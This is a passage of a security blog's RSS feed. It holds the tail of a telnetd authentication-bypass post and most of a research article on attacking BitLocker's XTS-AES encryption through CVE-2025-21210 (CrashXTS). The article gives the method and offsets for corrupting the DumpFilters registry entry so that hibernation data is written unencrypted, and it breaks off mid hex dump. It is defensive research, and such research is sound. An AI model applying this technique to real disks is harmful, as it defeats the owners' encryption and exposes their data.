   &amp;&amp; !u[<span class="hljs-built_in">strcspn</span>(u, <span class="hljs-string">&quot;\t\n !\&quot;#$&amp;&apos;()*;&lt;=&gt;?[\\^`{|}~&quot;</span>)])        ? u : <span class="hljs-string">&quot;&quot;</span>    );}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://seclists.org/oss-sec/2026/q1/89">https://seclists.org/oss-sec/2026/q1/89</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Authentication-Bypass/">Authentication Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2026-24061/">CVE-2026-24061</category>
      
      <category domain="https://hackyboiz.github.io/tags/GNU/">GNU</category>
      
      <category domain="https://hackyboiz.github.io/tags/Inetutils/">Inetutils</category>
      
      <category domain="https://hackyboiz.github.io/tags/telnetd/">telnetd</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/24/bekim/2026-01-24/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Unlocking BitLocker: Windows Full-Disk Encryption Under Attack: Part 1 (EN)</title>
      <link>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/en/</link>
      <guid>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/en/</guid>
      <pubDate>Thu, 22 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2026/01/2</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p><img src="/2026/01/22/banda/BitLocker_part1/en/logo.jpg" alt></p><p>BitLocker is a disk encryption feature built into the Windows operating system designed to protect data by preventing unauthorized access when a device is lost, stolen, or accessed offline. BitLocker uses a combination of XTS-AES and TPM to provide strong key protection and data encryption; however, it does not provide integrity protection for the ciphertext itself. Today, we will understand the AES-XTS mechanism and examine the <a href="https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/">BitLocker CrashXTS</a> method, a vulnerability that can be discovered through this mechanism.</p><h3 id="1-1-Understanding-the-Boot-System"><a href="#1-1-Understanding-the-Boot-System" class="headerlink" title="1.1 Understanding the Boot System"></a>1.1 Understanding the Boot System</h3><p>The UEFI firmware reads the signed <code>bootmgfw.efi</code> and BCD (Boot Configuration Data) from the EFI System Partition (ESP). This section is composed of plaintext. Secure Boot validates this boot application and the chain&#x2019;s DBX to establish a root of trust. While the ESP boot components are read, if trust verification fails, the VMK unseal is denied, and the system moves to the recovery path.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image1.png" alt></p><p>Does the encrypted area only contain user files? No. BitLocker describes <strong>Key Protectors</strong> and the key hierarchy in the volume metadata. Specifically, it uses a two-layer key design consisting of the <strong>VMK (Volume Master Key)</strong> and <strong>FVEK (Full Volume Encryption Key)</strong>. The key actually used for block encryption/decryption is the FVEK.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image2.png" alt></p><p>The screenshot shows the output of the <code>manage-bde -protectors -get C:</code> command, which lists the key protectors registered for the C: volume. The &#x201C;numerical password&#x201D; shown here is one type of protector used to unlock the VMK; it serves as a recovery mechanism when TPM-based unsealing fails in the normal boot path or when the system falls back into recovery mode. In other words, a BitLocker volume does not only contain encrypted data: it also stores, as part of its metadata, information about how the VMK can be recovered and the key hierarchy (VMK &#x2192; FVEK), and ultimately relies on the FVEK to perform sector-level encryption and decryption.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image17.png" alt></p><p><strong>TPM</strong></p><p>The TPM is a dTPM (discrete TPM) hardware chip with a secure storage repository that isolates keys and counters inside the chip. It allows secret keys to be released based on boot reliability measurements (PCR - Platform Configuration Registers) to verify if the system has &#x201C;booted in a trusted state.&#x201D;</p><p>BitLocker seals the VMK to specific PCR values. By default, it uses PCR 7 (Secure Boot state, UEFI variables, Boot Manager code) and PCR 11 (BitLocker access control).</p><ul><li>If the boot chain is normal, the TPM allows the VMK to be <strong>unsealed</strong>.</li><li>If the boot chain has been tampered with, the PCR values change, the unseal fails, and the system moves to the recovery screen.  </li></ul><p><strong>VMK (Volume Master Key)</strong></p><p>The VMK is the parent key that protects the FVEK. If the VMK cannot be legitimately restored, the FVEK cannot be unlocked, and thus the sector plaintext cannot be accessed. The VMK can be wrapped by multiple protectors:</p><ul><li><strong>TPM Protector:</strong> Bound to TPM PCRs.</li><li><strong>Recovery Password Protector:</strong> A 48-digit numeric recovery key.</li><li><strong>Password Protector:</strong> User password.</li><li><strong>TPM+PIN Protector:</strong> Combination of TPM and PIN.  </li></ul><p><strong>FVEK (Full Volume Encryption Key)</strong></p><p>The FVEK handles the actual encryption of disk sectors. The targets encrypted by the FVEK include the kernel, drivers, software, and user data. The FVEK is an AES-256 (or AES-128) key. In XTS mode, 512 bits (or 256 bits) are actually used. Half is used for data encryption (K1), and the other half is used for tweak generation (K2)!  </p><h3 id="1-2-BitLocker-Filter-Driver-Operation-Principle"><a href="#1-2-BitLocker-Filter-Driver-Operation-Principle" class="headerlink" title="1.2 BitLocker Filter Driver Operation Principle"></a>1.2 BitLocker Filter Driver Operation Principle</h3><p>When the kernel loads, the BitLocker filter driver, <code>fvevol.sys</code>, intercepts disk I/O to perform encryption and decryption. Let&#x2019;s see how this is performed!</p><ol><li>When the computer boots, <code>winload.efi</code> loads the kernel and <code>BOOT_START</code> (0) drivers, and <code>fvevol.sys</code> is loaded together at this stage. (This is before NTFS mounts the system volume).</li><li>In the early boot stage, before keys are ready and TPM PCR 7/11 verification hasn&#x2019;t occurred (VMK/FVEK not yet ready), <code>fvevol.sys</code> operates in a <strong>locked</strong> state. At this stage, the boot environment (like <code>bootmgr</code> or <code>winload</code>) reads the FVE-FS (metadata), performs TPM verification, unseals the VMK, and then decrypts the FVEK.</li><li>Only when the VMK is unsealed and the FVEK is decrypted does <code>fvevol</code> switch to an <strong>unlocked</strong> state. From this point on, all data I/O for that volume is transparently encrypted and decrypted via the respective FVEK.</li></ol><p>In other words, the flow is: <code>App/Service</code> &#x2192; <code>NTFS (ReFS)</code> &#x2192; <code>I/O Manager</code> &#x2192; <code>[fvevol]</code> &#x2192; <code>volmgr/Storage Class</code> &#x2192; <code>Port/Miniport (NVMe/SATA)</code> &#x2192; <code>Disk</code>.</p><p>BitLocker&#x2019;s core encryption method, <strong>XTS-AES</strong>, encrypts data in disk sector units. It is designed so that each block applies a <strong>tweak value (based on sector/offset)</strong>, ensuring that identical plaintext generates different ciphertext depending on its location.</p><p>This design was introduced to mitigate the <strong>malleability</strong> problem found in CTR/CBC modes, where an attacker could manipulate plaintext by directly manipulating ciphertext. However, today we will look at a case showing that even this XTS structure is not perfectly secure.</p><h2 id="2-Windows-AES-CBC-vs-AES-XTS-Operation-Modes"><a href="#2-Windows-AES-CBC-vs-AES-XTS-Operation-Modes" class="headerlink" title="2. Windows AES-CBC vs. AES-XTS Operation Modes"></a>2. Windows AES-CBC vs. AES-XTS Operation Modes</h2><h3 id="2-1-BitLocker-Encryption-Mode"><a href="#2-1-BitLocker-Encryption-Mode" class="headerlink" title="2.1 BitLocker Encryption Mode"></a>2.1 BitLocker Encryption Mode</h3><p>We mentioned earlier that BitLocker encrypts sector data with the FVEK. To understand the vulnerability we&#x2019;ll explain today, we must focus on the <strong>&#x201C;operation mode used on the disk medium.&#x201D;</strong> A hint: a disk is an &#x201C;access medium that reads and writes to specific locations called sectors.&#x201D; Therefore, BitLocker must use a block cipher operation mode that operates securely even with random access to avoid vulnerabilities.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image3.png" alt></p><p>Starting with Windows 11, BitLocker defaults to using <strong>AES-XTS</strong> instead of the previously used AES-CBC. This is to reduce the attack surface that can structurally occur in the CBC encryption method.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image4.png" alt></p><script type="math/tex; mode=display">C_i = E_K\!\left(P_i \oplus C_{i-1}\right)</script><script type="math/tex; mode=display">P_i = D_K\!\left(C_i\right) \oplus C_{i-1}</script><p>The CBC encryption method is likely familiar to you. It chains AES blocks together. The points where CBC becomes problematic from a disk perspective are:</p><ol><li><p><strong>Chaining Dependency</strong></p><p> Because CBC inherently allows the previous block to affect the next block, it is difficult to manage in an environment like a disk where only intermediate blocks are changed. Disks may update only parts of a file, or the OS may update only specific sectors. Independent encryption/decryption per sector is impossible, causing performance degradation.</p></li><li><p><strong>Bit Flipping</strong></p><p> As seen in the CBC decryption formula, if an attacker flips a specific bit, the bit at the same position in the decrypted plaintext is flipped in the same way. This means the ciphertext can be manipulated to change the plaintext predictably.</p></li><li><p><strong>IV (Initialization Vector) Management Issues</strong></p><p> Each sector requires a unique IV. Using the sector number as an IV creates predictability, while using a random IV requires additional storage space.</p></li></ol><p>Considering this flow, in past CBC-based FDE (Full Disk Encryption), it was theoretically possible for an attacker to modify the ciphertext on the disk bit-by-bit to insert malicious payloads into the bootloader or OS code.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image5.png" alt></p><p>Due to the structural vulnerability of <strong>Malleability</strong> in CBC mode, the risk of tampering with encrypted boot sectors or critical OS files was raised. Accordingly, starting with <strong>TrueCrypt 5.0 in 2008</strong>, XTS-AES was pioneered, and Microsoft subsequently adopted <strong>XTS-AES</strong> as the standard for BitLocker starting with Windows 10 to counter these threats.</p><p>Checking the operation of XTS, XTS applies a value called a <strong>tweak</strong> to each block. This tweak is a value determined by the &#x2018;disk location,&#x2019; usually based on the sector number and the block index within the sector. A disk reads and writes in sectors of sizes like 512B (or 4KB), and since AES is a 16B block, a 512B sector would be divided into 32 blocks. XTS is designed so that a different tweak is applied to each of these 16B blocks.</p><script type="math/tex; mode=display">T_i = \mathrm{Tweak}_{K_2}(s, j)</script><script type="math/tex; mode=display">C_i = E_{K_1}\!\left(P_i \oplus T_i\right) \oplus T_i</script><p>XTS uses two keys. <strong>Key1</strong> is used for the purpose of encrypting and decrypting the actual data, and <strong>Key2</strong> is used for generating the tweak containing the data&#x2019;s location information.</p><p>Using this XTS mode, even if an attacker manipulates a specific ciphertext block, the <strong>non-linearity</strong> causes the result to be damaged in a way that is unpredictable and close to random at the 16-byte block level. In other words, sophisticated manipulation, such as changing a specific bit of the next block to a desired value like in CBC, becomes virtually impossible.</p><h3 id="2-2-Unresolved-Challenges-of-XTS"><a href="#2-2-Unresolved-Challenges-of-XTS" class="headerlink" title="2.2 Unresolved Challenges of XTS"></a>2.2 Unresolved Challenges of XTS</h3><p><img src="/2026/01/22/banda/BitLocker_part1/en/image6.png" alt></p><p>However, XTS still has the following fundamental limitations:</p><ol><li><p><strong>Lack of Integrity Protection</strong></p><p> XTS makes manipulation results difficult to predict, but it does not provide integrity protection to detect or reject the manipulation itself. If an attacker changes the ciphertext, the system does not detect this tampering to stop the process. The system simply decrypts the tampered data and processes it as broken plaintext (garbage).</p></li><li><p><strong>Granular Tampering Detection</strong></p><p> XTS accurately isolates changes to the specific block level. Paradoxically, this offers better granularity than CBC, providing useful clues for identifying the specific location where the modification occurred. An attacker can easily verify &#x201C;which block has changed&#x201D; from the perspective of the entire disk.</p></li><li><p><strong>Copy-Paste Attacks</strong></p><p> Identical plaintext blocks always generate identical ciphertext in the same sector. An attacker can copy a previous version of the ciphertext from the same sector and overwrite the current version, or copy ciphertext from another sector and paste it.</p></li><li><p><strong>Narrow Block Size</strong></p><p> Since XTS operates in 16-byte block units, if the same 16-byte plaintext pattern is repeated, a pattern may also be observed in the ciphertext. This can be used for ciphertext analysis.</p></li></ol><p><img src="/2026/01/22/banda/BitLocker_part1/en/image7.png" alt></p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image8.png" alt></p><p>To verify this directly, we conducted a practical experiment to intuitively check the lack of integrity in XTS-AES on a BitLocker volume. First, we created a 16MiB file on a BitLocker-protected volume (V:), output its SHA-256 hash immediately after creation, and recorded it as the baseline. Then, with the volume locked, we directly edited the raw disk area to partially tamper with the 16-byte ciphertext block containing the file. After unlocking the volume again and recalculating the SHA-256 hash of the same file, we confirmed that the hash value had changed compared to the baseline.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image9.png" alt></p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image10.png" alt></p><p>Even if only 1 bit is changed in the ciphertext, in XTS results, changing 1 bit randomizes the entire corresponding 16-byte block. At the same time, we can confirm that this has no effect on other neighboring blocks.</p><p><strong>Why Windows Cannot Switch to AEAD</strong></p><p>However, there are limitations for Windows to completely switch to a form of disk encryption that attaches integrity, such as MAC or AEAD.</p><ol><li><strong>Full System Redesign Required:</strong> Adding integrity is not just a matter of changing the encryption mode; it requires a complete redesign of the system architecture regarding how the Windows boot, recovery, file system, and crash dump paths handle integrity failures.</li><li><strong>Performance Overhead:</strong> Adding a MAC to every sector has a significant impact on storage space and I/O performance.</li><li><strong>Partial Write Problem:</strong> File systems often modify only parts of a sector, but AEAD operates on the whole unit, making this complex to handle.</li><li><strong>Recovery Scenarios:</strong> If a part of the disk is damaged, integrity verification failure could make the entire volume unmountable.</li></ol><p>Due to concerns about availability degradation&#x2014;where mounting the entire volume could be refused due to strict verification failures from small data corruption&#x2014;it is said that it is difficult to prepare a complete countermeasure for this yet.</p><h3 id="2-3-CASE-CVE-2025-21210-CrashXTS"><a href="#2-3-CASE-CVE-2025-21210-CrashXTS" class="headerlink" title="2.3 CASE: CVE-2025-21210 (CrashXTS)"></a>2.3 CASE: CVE-2025-21210 (CrashXTS)</h3><p>The property of XTS that &#x201C;the same sector is encrypted with the same tweak&#x201D; means that given the same sector number and the same FVEK, the same plaintext is always converted to the same ciphertext. Even if rebooted multiple times, the ciphertext remains constant as long as the sector number does not change. Also, while it is difficult to obtain a Write primitive in XTS, we can cause the system operation flow to fail via <strong>Corrupt</strong>. This point is explained by <strong>CVE-2025-21210</strong>, <a href="https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf">known as CrashXTS</a>.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image11.png" alt></p><p>When BitLocker processes normal runtime I/O in Windows, XTS-AES encryption/decryption is applied sector-by-sector via the <code>fvevol.sys</code> stack. However, in special paths that write directly to the disk with a minimal dump stack&#x2014;such as <strong>Crash Dump/Hibernation</strong>&#x2014;we cannot assume that all filters in the normal I/O path are operating. Because of this, BitLocker separately loads a dump filter called <code>dumpfve.sys</code> designed to maintain encryption even when dump/hibernation data is written to the disk.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image12.png" alt></p><p>This flow is also confirmed in decompiled code. The function goes through the process <code>FveGroupPolicyGetMultiSzValue()</code> to read the <code>DumpFilters</code> value under <code>SYSTEM\CurrentControlSet\Control\CrashControl</code>, and iterates through the list to check if <code>dumpfve.sys</code> is included via <code>_wcsicmp()</code>. Furthermore, if <code>dumpfve.sys</code> is missing or parsing fails, it aborts immediately. Normally, the flow prevents dump/hibernation from proceeding if the encryption dump filter is missing.</p><p>However, the problem is that <strong>XTS-based disk encryption does not provide integrity.</strong> By using the properties of XTS to manipulate a specific ciphertext block and break the 16-byte plaintext block, one can damage the block containing the <code>DumpFilters</code> offset inside the Registry Hive. This induces a state where the parser cannot normally locate the <code>DumpFilters</code> entry. In other words, the goal is to induce the failure of the expected operation through this <strong>Corrupt</strong>.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image13.png" alt></p><p>The screen shows the bytes around the <code>ControlSet...\Control\CrashControl</code> key inside the SYSTEM registry hive as Hex values. In the ASCII area on the right, strings like <code>CrashControl</code>, <code>AutoReboot</code>, <code>CrashDumpEnabled</code>, <code>DumpFile</code>, and <code>DumpFilters</code> are visible. This means the key/value names exist as strings inside the actual file.</p><p>In XTS, if you manipulate the ciphertext, the plaintext of that 16-byte block is uncontrollably randomized. That is, if you target the 4-byte offset inside the registry hive structure and randomize the 16-byte block containing this field, from the kernel&#x2019;s perspective, it looks as if the <code>DumpFilters</code> value does not exist, and the hive loader enters a state where it cannot find the value list location. And inducing this is our goal!</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image14.png" alt></p><p>Considering the entire disk, there are a huge number of 16-byte blocks. Since we cannot pick a random block on a multi-GB disk to break <code>DumpFilters</code>, we find that the <code>CrashControl</code> string is near the hive file offset <code>0x13B330</code>. Then, we can consider a method of keeping only a few dozen surrounding blocks as candidates and breaking them one by one. We confirmed via Hex values that the <code>DumpFilter</code> related structure is located approximately 248 bytes away from the location containing <code>CrashControl</code>. 248 bytes is roughly 15.5 blocks in terms of 16-byte blocks. Therefore, we can target blocks around <code>+0xF0</code> or <code>+0x100</code> as candidate blocks.</p><p><img src="/2026/01/22/banda/BitLocker_part1/en/image15.png" alt></p><p>So, how can we specifically find where the SYSTEM hive is in the encrypted volume and where the <code>CrashControl</code> key node is located within it? If you trigger states like clean shutdown, forced shutdown, or reboot after a crash on the same computer, specific blocks in the SYSTEM hive file change. This part can be identified as near the start of the SYSTEM hive. Specifically, after a BSOD reboot, a specific volatile subkey called <code>LastCrashDump</code> is created under <code>CrashControl</code> and disappears after a clean shutdown. At this time, only some fields of the corresponding key node structure change in a predictable way. In other words, by scanning the entire hive, blocks that change exactly according to that pattern can be thought of as the <code>CrashControl</code> key node!</p><p><strong>Normal Boot State</strong></p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x0056e2f0  a0 ff ff ff 6e 6b 20 00 ad 71 01 42 ed f0 da 01    ....nk ..q.B....<span class="hljs-number">0x0056e300</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ................<span class="hljs-number">0x0056e310</span>  <span class="hljs-number">28</span> <span class="hljs-number">7b</span> <span class="hljs-number">74</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">38</span> f4 a7 <span class="hljs-number">00</span>    ({t........<span class="hljs-number">.8</span>...<span class="hljs-number">0x0056e320</span>  <span class="hljs-number">08</span> bc <span class="hljs-number">46</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ..F..... .......<span class="hljs-number">0x0056e330</span>  <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ,..<span class="hljs-number">.0</span>...........<span class="hljs-number">0x0056e340</span>  <span class="hljs-number">43</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">43</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    CrashControl....</code></pre><p><strong>Immediately After Crash/BSOD</strong></p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x0056e2f0  a0 ff ff ff 6e 6b 20 00 73 62 74 ab 14 f7 da 01    ....nk ..sbt.....<span class="hljs-number">0x0056e300</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ................<span class="hljs-number">0x0056e310</span>  <span class="hljs-number">28</span> <span class="hljs-number">7b</span> <span class="hljs-number">74</span> <span class="hljs-number">00</span> c8 <span class="hljs-number">8</span>e <span class="hljs-number">01</span> <span class="hljs-number">80</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">38</span> f4 a7 <span class="hljs-number">00</span>    ({t........<span class="hljs-number">.8</span>...<span class="hljs-number">0x0056e320</span>  <span class="hljs-number">08</span> bc <span class="hljs-number">46</span> <span class="hljs-number">00</span> ff ff ff ff <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ..F..... .......<span class="hljs-number">0x0056e330</span>  <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ,..<span class="hljs-number">.0</span>...........<span class="hljs-number">0x0056e340</span>  <span class="hljs-number">43</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">43</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    CrashControl....</code></pre><p>Looking at the two dumps, the first thing that stands out is that the string itself is maintained. In both states, the <code>CrashControl</code> string remains at line <code>0x0056e340</code>. In other words, it is not a situation where the text <code>CrashControl</code> disappears and cannot be found, but a state where some fields inside the structure describing <code>CrashControl</code> change. It is not that the whole thing is swapped, but only <strong>some fields of the structure change selectively</strong>. And this becomes a strong clue that we are looking at a structure with some meaning, not a random dump.</p><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x00000000  9c 1e d1 7a 39 39 d4 13 0c d4 40 c5 a8 6f c4 de    ...z99....@..o..<span class="hljs-number">0x00000010</span>  e0 <span class="hljs-number">79</span> bc <span class="hljs-number">2</span>d dd <span class="hljs-number">66</span> e2 <span class="hljs-number">25</span> b0 <span class="hljs-number">48</span> <span class="hljs-number">0f</span> <span class="hljs-number">58</span> <span class="hljs-number">53</span> <span class="hljs-number">2f</span> <span class="hljs-number">06</span> <span class="hljs-number">5</span>d    .y.-.f.%.H.XS/.]<span class="hljs-number">0x00000020</span>  <span class="hljs-number">74</span> ac c3 <span class="hljs-number">51</span> <span class="hljs-number">86</span> <span class="hljs-number">9</span>e <span class="hljs-number">74</span> <span class="hljs-number">64</span> e2 d9 <span class="hljs-number">6</span>e d0 <span class="hljs-number">9</span>c <span class="hljs-number">11</span> ee <span class="hljs-number">4</span>d    t..Q..td..n....M<span class="hljs-number">0x00000030</span>  <span class="hljs-number">03</span> <span class="hljs-number">40</span> <span class="hljs-number">03</span> <span class="hljs-number">52</span> <span class="hljs-number">05</span> e0 bc <span class="hljs-number">37</span> <span class="hljs-number">41</span> c1 <span class="hljs-number">3f</span> a2 <span class="hljs-number">7</span>e <span class="hljs-number">2</span>a <span class="hljs-number">09</span> <span class="hljs-number">84</span>    .@.R..<span class="hljs-number">.7</span>A.?.~*..<span class="hljs-number">0x00000040</span>  <span class="hljs-number">24</span> <span class="hljs-number">80</span> dc b8 <span class="hljs-number">6</span>a <span class="hljs-number">20</span> c8 <span class="hljs-number">81</span> <span class="hljs-number">2</span>d c6 <span class="hljs-number">61</span> <span class="hljs-number">30</span> <span class="hljs-number">39</span> <span class="hljs-number">9f</span> <span class="hljs-number">30</span> <span class="hljs-number">51</span>    $...j ..-.a09<span class="hljs-number">.0</span>Q<span class="hljs-number">0x00000050</span>  <span class="hljs-number">31</span> <span class="hljs-number">1b</span> <span class="hljs-number">0</span>c <span class="hljs-number">74</span> <span class="hljs-number">80</span> <span class="hljs-number">96</span> <span class="hljs-number">8</span>c f2 ad <span class="hljs-number">9</span>d <span class="hljs-number">28</span> <span class="hljs-number">26</span> f9 ce <span class="hljs-number">8</span>d <span class="hljs-number">16</span>    <span class="hljs-number">1.</span>.t......(&amp;....<span class="hljs-number">0x00000060</span>  <span class="hljs-number">1</span>c <span class="hljs-number">23</span> fd d1 <span class="hljs-number">08</span> <span class="hljs-number">45</span> f0 c1 <span class="hljs-number">84</span> bb e5 <span class="hljs-number">84</span> bf b6 <span class="hljs-number">73</span> <span class="hljs-number">17</span>    .#...E........s.<span class="hljs-number">0x00000070</span>  f0 e3 <span class="hljs-number">50</span> f2 <span class="hljs-number">7</span>c <span class="hljs-number">35</span> <span class="hljs-number">7b</span> <span class="hljs-number">91</span> bd e5 <span class="hljs-number">5</span>e b3 a7 <span class="hljs-number">4</span>d <span class="hljs-number">4</span>c bf    ..P.|<span class="hljs-number">5</span>{...^..ML.<span class="hljs-number">0x00000080</span>  db f0 de <span class="hljs-number">96</span> ba <span class="hljs-number">50</span> d9 <span class="hljs-number">09</span> <span class="hljs-number">3</span>d <span class="hljs-number">83</span> b2 fb <span class="hljs-number">1</span>a f4 <span class="hljs-number">35</span> aa    .....P..=....<span class="hljs-number">.5</span>.</code></pre><pre><code class="hljs c"><span class="hljs-function">Offset      Hex <span class="hljs-title">bytes</span> <span class="hljs-params">(<span class="hljs-number">16B</span>)</span>                                      ASCII</span>0x00000000  48 49 42 52 09 00 00 00 33 c0 00 00 d8 04 00 00    HIBR....3.......<span class="hljs-number">0x00000010</span>  <span class="hljs-number">04</span> <span class="hljs-number">3</span>e <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    .&gt;..............<span class="hljs-number">0x00000020</span>  <span class="hljs-number">3</span>e <span class="hljs-number">73</span> b2 <span class="hljs-number">1f</span> <span class="hljs-number">2b</span> f7 da <span class="hljs-number">01</span> <span class="hljs-number">3</span>e <span class="hljs-number">1</span>d <span class="hljs-number">07</span> <span class="hljs-number">2</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    &gt;s..+...&gt;..*....<span class="hljs-number">0x00000030</span>  ff bd <span class="hljs-number">9b</span> bd <span class="hljs-number">7f</span> a4 <span class="hljs-number">5f</span> <span class="hljs-number">06</span> <span class="hljs-number">01</span> ca <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ......_.........<span class="hljs-number">0x00000040</span>  <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">44</span> a8 <span class="hljs-number">80</span> c2 ff ff <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">4</span>e <span class="hljs-number">21</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    <span class="hljs-number">.0</span>D.........N!..<span class="hljs-number">0x00000050</span>  <span class="hljs-number">61</span> d7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">54</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    a......<span class="hljs-number">.4</span>T......<span class="hljs-number">0x00000060</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ........,.......<span 